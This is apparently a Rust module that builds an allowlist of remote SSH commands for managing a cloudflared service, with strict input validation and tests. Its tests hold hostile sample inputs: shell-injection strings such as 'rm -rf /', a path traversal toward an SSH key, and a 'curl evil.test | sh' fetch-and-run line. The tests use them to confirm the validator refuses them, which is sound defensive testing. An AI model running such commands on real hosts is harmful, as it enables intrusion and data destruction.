//! The allowlist of things this application will run on someone else's
//! machine.
//!
//! The SSH protocol has no argv: `exec` takes one string and the remote shell
//! splits it. That makes every remote command a potential injection site, so
//! the defence here is structural rather than procedural:
//!
//! 1. **There is no free-text command.** [`RemoteCommand`] is a closed enum.
//!    Nothing in the UI can produce a command that is not one of these, and
//!    there is deliberately no terminal, no "run this" field and no escape
//!    hatch.
//! 2. **The only substituted values are a systemd unit name, a file path and
//!    a line count**, and each is validated against a charset that contains no
//!    shell metacharacter before it is used. [`shell_quote`] refuses rather
//!    than escapes: a value that would need escaping is a value that should
//!    never have got this far.
//! 3. **Every privileged command is `sudo -n`.** Non-interactive: if the host
//!    would prompt for a password, the command fails with a message the user
//!    can act on instead of hanging on a prompt nobody can see.

use crate::domain::validation::{self, ValidationError, ValidationResult};
use serde::{Deserialize, Serialize};

/// The maximum number of journal lines this application will ever ask for.
/// Logs can contain anything the service chose to print, so the amount pulled
/// across is bounded rather than "whatever the user typed".
pub const MAX_LOG_LINES: u16 = 200;
pub const DEFAULT_LOG_LINES: u16 = 50;

/// What a service action asks systemd to do.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ServiceAction {
    Start,
    Stop,
    Restart,
}

impl ServiceAction {
    pub fn verb(self) -> &'static str {
        match self {
            Self::Start => "start",
            Self::Stop => "stop",
            Self::Restart => "restart",
        }
    }

    pub fn label(self) -> &'static str {
        match self {
            Self::Start => "Start Connector",
            Self::Stop => "Stop Connector",
            Self::Restart => "Restart Connector",
        }
    }

    /// Whether the action can interrupt traffic, and so needs confirmation.
    pub fn is_disruptive(self) -> bool {
        matches!(self, Self::Stop | Self::Restart)
    }
}

/// Every command this application knows how to run remotely.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RemoteCommand {
    /// `uname -s` — is this Linux at all?
    Kernel,
    /// `systemctl --version` — is this a systemd host?
    SystemdVersion,
    /// `command -v cloudflared` — is it installed, and where?
    CloudflaredPath,
    /// `cloudflared --version`
    CloudflaredVersion,
    /// Whether the unit exists and what state it is in.
    ServiceState { unit: String },
    /// Whether `sudo -n systemctl <verb> <unit>` would be permitted, asked
    /// without running anything.
    SudoCheck { unit: String },
    /// Start, stop or restart the unit.
    Service { unit: String, action: ServiceAction },
    /// A bounded tail of the unit's journal.
    Logs { unit: String, lines: u16 },
    /// Read the unit's `ExecStart`, to tell whether it is configured for a
    /// token file and for which tunnel.
    UnitExecStart { unit: String },
    /// Read the unit's `Environment=` block, which is where a transport
    /// protocol override would live.
    UnitEnvironment { unit: String },
    /// Whether a path exists, for the deployment preview.
    PathExists { path: String },
    /// `systemctl daemon-reload`, after a unit file has been written.
    DaemonReload,
    /// Enable and start the unit in one step, after deployment.
    EnableNow { unit: String },
    /// Create the token directory, root-owned and unreadable by anyone else.
    MakeTokenDir { dir: String },
    /// Create a directory a file is about to be installed into — the unit's
    /// drop-in directory. World-readable: unlike the token directory, what
    /// lands in it is configuration, not a credential.
    MakeDir { dir: String },
    /// Remove exactly one file by absolute path. Exists to undo the protocol
    /// drop-in this application writes; the path is validated against the
    /// same charset as every other substituted value.
    RemoveFile { path: String },
    /// Install a file from this command's stdin at `path`, mode 0600,
    /// root-owned. Used for the tunnel token and for the unit file.
    ///
    /// The content travels over the SSH channel's stdin, never on the command
    /// line — so the token cannot appear in the remote process table, in
    /// `~/.bash_history`, or in anything `ps` can see.
    InstallFromStdin { path: String, mode: &'static str },
}

impl RemoteCommand {
    /// Renders the command line.
    ///
    /// Returns an error rather than a mangled string if any substituted value
    /// is outside its safe charset. That should be impossible — every caller
    /// validates first — which is precisely why it is checked again here.
    pub fn render(&self) -> ValidationResult<String> {
        Ok(match self {
            Self::Kernel => "uname -s".into(),

            Self::SystemdVersion => "systemctl --version".into(),

            // `command -v` is a shell builtin, present everywhere, and unlike
            // `which` it does not depend on a package being installed.
            Self::CloudflaredPath => "command -v cloudflared".into(),

            Self::CloudflaredVersion => "cloudflared --version".into(),

            // One call, three facts: whether the unit is loaded, whether it is
            // running, and whether it is enabled. `--value` keeps the output
            // to three bare lines that are trivial to parse.
            Self::ServiceState { unit } => format!(
                "systemctl show {} --property=LoadState --property=ActiveState \
                 --property=UnitFileState --value --no-pager",
                shell_quote(unit)?
            ),

            // `sudo -n -l <command>` answers "would this be allowed?" without
            // running it and without prompting. A host with a least-privilege
            // sudoers rule for exactly this command answers yes; a host with
            // no rule answers no, and the UI can say so before the user
            // presses a button that would fail.
            Self::SudoCheck { unit } => format!(
                "sudo -n -l /usr/bin/systemctl restart {} > /dev/null 2>&1 && echo allowed || \
                 (sudo -n -l systemctl > /dev/null 2>&1 && echo allowed || echo denied)",
                shell_quote(unit)?
            ),

            Self::Service { unit, action } => {
                format!("sudo -n systemctl {} {}", action.verb(), shell_quote(unit)?)
            }

            // `--no-pager` because there is no terminal; `-n` bounds the
            // output; `-o short-iso` gives a timestamp the UI can show
            // without guessing the host's locale.
            Self::Logs { unit, lines } => format!(
                "sudo -n journalctl -u {} -n {} --no-pager -o short-iso",
                shell_quote(unit)?,
                lines.min(&MAX_LOG_LINES)
            ),

            Self::UnitExecStart { unit } => format!(
                "systemctl show {} --property=ExecStart --value --no-pager",
                shell_quote(unit)?
            ),

            Self::UnitEnvironment { unit } => format!(
                "systemctl show {} --property=Environment --value --no-pager",
                shell_quote(unit)?
            ),

            Self::PathExists { path } => {
                format!("test -e {} && echo yes || echo no", shell_quote(path)?)
            }

            Self::DaemonReload => "sudo -n systemctl daemon-reload".into(),

            Self::EnableNow { unit } => {
                format!("sudo -n systemctl enable --now {}", shell_quote(unit)?)
            }

            Self::MakeTokenDir { dir } => format!(
                "sudo -n install -d -m 0700 -o root -g root {}",
                shell_quote(dir)?
            ),

            Self::MakeDir { dir } => format!(
                "sudo -n install -d -m 0755 -o root -g root {}",
                shell_quote(dir)?
            ),

            Self::RemoveFile { path } => {
                format!("sudo -n rm -f {}", shell_quote(path)?)
            }

            // `install` rather than `tee`: it sets the mode and owner
            // atomically as it writes, so there is no window in which the
            // token exists at the default umask.
            Self::InstallFromStdin { path, mode } => format!(
                "sudo -n install -m {} -o root -g root /dev/stdin {}",
                mode,
                shell_quote(path)?
            ),
        })
    }

    /// A short phrase for the activity log and for an error message. Never
    /// contains a substituted value, so it is safe to log verbatim.
    pub fn description(&self) -> &'static str {
        match self {
            Self::Kernel => "check the operating system",
            Self::SystemdVersion => "check for systemd",
            Self::CloudflaredPath | Self::CloudflaredVersion => "check for cloudflared",
            Self::ServiceState { .. } => "read the service state",
            Self::SudoCheck { .. } => "check sudo permissions",
            Self::Service { .. } => "control the service",
            Self::Logs { .. } => "read recent logs",
            Self::UnitExecStart { .. } => "read the unit's command line",
            Self::UnitEnvironment { .. } => "read the unit's environment",
            Self::PathExists { .. } => "check whether a file exists",
            Self::DaemonReload => "reload systemd",
            Self::EnableNow { .. } => "enable and start the service",
            Self::MakeTokenDir { .. } => "create the token directory",
            Self::MakeDir { .. } => "create a directory",
            Self::RemoveFile { .. } => "remove a file this application wrote",
            Self::InstallFromStdin { .. } => "write a file",
        }
    }

    /// Whether the command changes anything on the host. Read-only commands
    /// are safe to run during a refresh; the rest need an explicit action.
    pub fn is_mutating(&self) -> bool {
        matches!(
            self,
            Self::Service { .. }
                | Self::DaemonReload
                | Self::EnableNow { .. }
                | Self::MakeTokenDir { .. }
                | Self::MakeDir { .. }
                | Self::RemoveFile { .. }
                | Self::InstallFromStdin { .. }
        )
    }

    /// Whether the command needs `sudo`.
    pub fn is_privileged(&self) -> bool {
        matches!(
            self,
            Self::Service { .. }
                | Self::Logs { .. }
                | Self::SudoCheck { .. }
                | Self::DaemonReload
                | Self::EnableNow { .. }
                | Self::MakeTokenDir { .. }
                | Self::MakeDir { .. }
                | Self::RemoveFile { .. }
                | Self::InstallFromStdin { .. }
        )
    }
}

/// Wraps a value in single quotes, having first checked it needs no escaping.
///
/// Refusing rather than escaping is the whole point. A correct escaper is easy
/// to write and easy to get subtly wrong under a shell nobody tested; a
/// charset check is neither. Every value reaching here has already been
/// through [`crate::domain::validation`], so a refusal means a bug upstream,
/// not a user mistake.
pub fn shell_quote(value: &str) -> ValidationResult<String> {
    if value.is_empty() {
        return Err(ValidationError::new("An empty value cannot be used here."));
    }
    if value.len() > 256 {
        return Err(ValidationError::new("That value is too long to send."));
    }

    let safe = value
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/' | '@' | '+' | ':'));

    if !safe {
        return Err(ValidationError::new(
            "That value contains characters that cannot be sent to a remote host.",
        ));
    }
    // A leading hyphen would be read as an option by whatever runs it.
    if value.starts_with('-') {
        return Err(ValidationError::new(
            "That value cannot begin with a hyphen.",
        ));
    }
    // Path traversal, even inside an already-safe charset.
    if value.contains("..") {
        return Err(ValidationError::new("That value cannot contain “..”."));
    }

    Ok(format!("'{value}'"))
}

/// Builds the read-only preflight sequence for a unit.
pub fn preflight_commands(unit: &str) -> ValidationResult<Vec<RemoteCommand>> {
    let unit = validation::systemd_unit(unit)?;
    Ok(vec![
        RemoteCommand::Kernel,
        RemoteCommand::SystemdVersion,
        RemoteCommand::CloudflaredPath,
        RemoteCommand::CloudflaredVersion,
        RemoteCommand::ServiceState { unit: unit.clone() },
        RemoteCommand::UnitExecStart { unit: unit.clone() },
        RemoteCommand::SudoCheck { unit },
    ])
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn quoting_accepts_a_plain_unit_name() {
        assert_eq!(
            shell_quote("cloudflared.service").unwrap(),
            "'cloudflared.service'"
        );
        assert_eq!(
            shell_quote("cloudflared@edge.service").unwrap(),
            "'cloudflared@edge.service'"
        );
        assert_eq!(
            shell_quote("/etc/cloudflared/token").unwrap(),
            "'/etc/cloudflared/token'"
        );
    }

    #[test]
    fn quoting_refuses_every_shell_metacharacter() {
        for hostile in [
            "a;rm -rf /",
            "a && id",
            "a | tee /etc/passwd",
            "a$(id)",
            "a`id`",
            "a'b",
            "a\"b",
            "a\nb",
            "a b",
            "a>b",
            "a<b",
            "a\\b",
            "a&b",
            "a*b",
            "a?b",
            "a{b}",
            "a[b]",
            "a!b",
            "a#b",
            "a~b",
            "a%b",
            "a\0b",
        ] {
            assert!(
                shell_quote(hostile).is_err(),
                "{hostile:?} must be refused, not escaped"
            );
        }
    }

    #[test]
    fn quoting_refuses_a_leading_hyphen_and_path_traversal() {
        assert!(shell_quote("-rf").is_err());
        assert!(shell_quote("/etc/../root/.ssh/id_rsa").is_err());
        assert!(shell_quote("").is_err());
        assert!(shell_quote(&"a".repeat(300)).is_err());
    }

    #[test]
    fn rendering_a_service_action_quotes_the_unit() {
        let command = RemoteCommand::Service {
            unit: "cloudflared.service".into(),
            action: ServiceAction::Restart,
        };
        assert_eq!(
            command.render().unwrap(),
            "sudo -n systemctl restart 'cloudflared.service'"
        );
    }

    #[test]
    fn the_protocol_drop_in_commands_render_quoted_and_scoped() {
        let unit_environment = RemoteCommand::UnitEnvironment {
            unit: "cloudflared.service".into(),
        };
        assert_eq!(
            unit_environment.render().unwrap(),
            "systemctl show 'cloudflared.service' --property=Environment --value --no-pager"
        );
        assert!(!unit_environment.is_privileged());

        let make_dir = RemoteCommand::MakeDir {
            dir: "/etc/systemd/system/cloudflared.service.d".into(),
        };
        assert_eq!(
            make_dir.render().unwrap(),
            "sudo -n install -d -m 0755 -o root -g root '/etc/systemd/system/cloudflared.service.d'"
        );

        let remove = RemoteCommand::RemoveFile {
            path: "/etc/systemd/system/cloudflared.service.d/tunnel-manager-protocol.conf".into(),
        };
        let rendered = remove.render().unwrap();
        assert!(rendered.starts_with("sudo -n rm -f '/etc/systemd/system/"));
        assert!(rendered.ends_with(".conf'"));
        assert!(remove.is_mutating());
        assert!(remove.is_privileged());

        // Traversal in a drop-in path is refused like anywhere else.
        assert!(RemoteCommand::RemoveFile {
            path: "/etc/systemd/system/cloudflared.service.d/../../passwd".into()
        }
        .render()
        .is_err());
    }

    #[test]
    fn a_hostile_unit_name_cannot_be_rendered() {
        let command = RemoteCommand::Service {
            unit: "cloudflared.service; curl evil.test | sh".into(),
            action: ServiceAction::Restart,
        };
        assert!(command.render().is_err());
    }

    #[test]
    fn every_privileged_command_is_non_interactive_sudo() {
        let commands = [
            RemoteCommand::Service {
                unit: "cloudflared.service".into(),
                action: ServiceAction::Start,
            },
            RemoteCommand::Logs {
                unit: "cloudflared.service".into(),
                lines: 20,
            },
            RemoteCommand::DaemonReload,
            RemoteCommand::EnableNow {
                unit: "cloudflared.service".into(),
            },
            RemoteCommand::MakeTokenDir {
                dir: "/etc/cloudflared".into(),
            },
            RemoteCommand::InstallFromStdin {
                path: "/etc/cloudflared/token".into(),
                mode: "0600",
            },
        ];

        for command in commands {
            let rendered = command.render().unwrap();
            assert!(command.is_privileged(), "{rendered}");
            assert!(
                rendered.contains("sudo -n"),
                "{rendered} must never be able to prompt for a password"
            );
        }
    }

    #[test]
    fn read_only_commands_are_not_marked_mutating() {
        for command in preflight_commands("cloudflared.service").unwrap() {
            assert!(
                !command.is_mutating(),
                "{:?} runs during a refresh and must change nothing",
                command
            );
        }
    }

    #[test]
    fn log_lines_are_capped() {
        let command = RemoteCommand::Logs {
            unit: "cloudflared.service".into(),
            lines: u16::MAX,
        };
        let rendered = command.render().unwrap();
        assert!(
            rendered.contains(&format!("-n {MAX_LOG_LINES}")),
            "got {rendered}"
        );
    }

    #[test]
    fn the_token_file_is_written_root_owned_and_unreadable() {
        let rendered = RemoteCommand::InstallFromStdin {
            path: "/etc/cloudflared/tunnel.token".into(),
            mode: "0600",
        }
        .render()
        .unwrap();

        assert!(rendered.contains("-m 0600"));
        assert!(rendered.contains("-o root -g root"));
        assert!(
            rendered.contains("/dev/stdin"),
            "the content must arrive over stdin, never on the command line"
        );
        assert!(
            !rendered.contains("echo") && !rendered.contains("tee"),
            "no shell construct that could put the content in the process table"
        );
    }

    #[test]
    fn no_rendered_command_ever_contains_a_secret_placeholder() {
        // A structural check: nothing in the enum takes secret content, so no
        // rendering can contain one.
        let unit = "cloudflared.service".to_string();
        let all = [
            RemoteCommand::Kernel,
            RemoteCommand::SystemdVersion,
            RemoteCommand::CloudflaredPath,
            RemoteCommand::CloudflaredVersion,
            RemoteCommand::ServiceState { unit: unit.clone() },
            RemoteCommand::SudoCheck { unit: unit.clone() },
            RemoteCommand::Service {
                unit: unit.clone(),
                action: ServiceAction::Start,
            },
            RemoteCommand::Logs {
                unit: unit.clone(),
                lines: 10,
            },
            RemoteCommand::UnitExecStart { unit: unit.clone() },
            RemoteCommand::UnitEnvironment { unit: unit.clone() },
            RemoteCommand::PathExists {
                path: "/etc/cloudflared".into(),
            },
            RemoteCommand::DaemonReload,
            RemoteCommand::EnableNow { unit: unit.clone() },
            RemoteCommand::MakeTokenDir {
                dir: "/etc/cloudflared".into(),
            },
            RemoteCommand::MakeDir {
                dir: "/etc/systemd/system/cloudflared.service.d".into(),
            },
            RemoteCommand::RemoveFile {
                path: "/etc/systemd/system/cloudflared.service.d/tunnel-manager-protocol.conf"
                    .into(),
            },
            RemoteCommand::InstallFromStdin {
                path: "/etc/cloudflared/t".into(),
                mode: "0600",
            },
        ];

        for command in all {
            let rendered = command.render().expect("every command renders");
            for forbidden in ["--token ", "TUNNEL_TOKEN=", "eyJ"] {
                assert!(
                    !rendered.contains(forbidden),
                    "{rendered} could expose a token"
                );
            }
            assert!(!command.description().is_empty());
        }
    }

    #[test]
    fn preflight_rejects_a_bad_unit_before_building_anything() {
        assert!(preflight_commands("../../etc/passwd").is_err());
        assert!(preflight_commands("cloudflared.socket").is_err());
        assert_eq!(preflight_commands("cloudflared").unwrap().len(), 7);
    }

    #[test]
    fn stop_and_restart_are_disruptive_but_start_is_not() {
        assert!(!ServiceAction::Start.is_disruptive());
        assert!(ServiceAction::Stop.is_disruptive());
        assert!(ServiceAction::Restart.is_disruptive());
    }
}
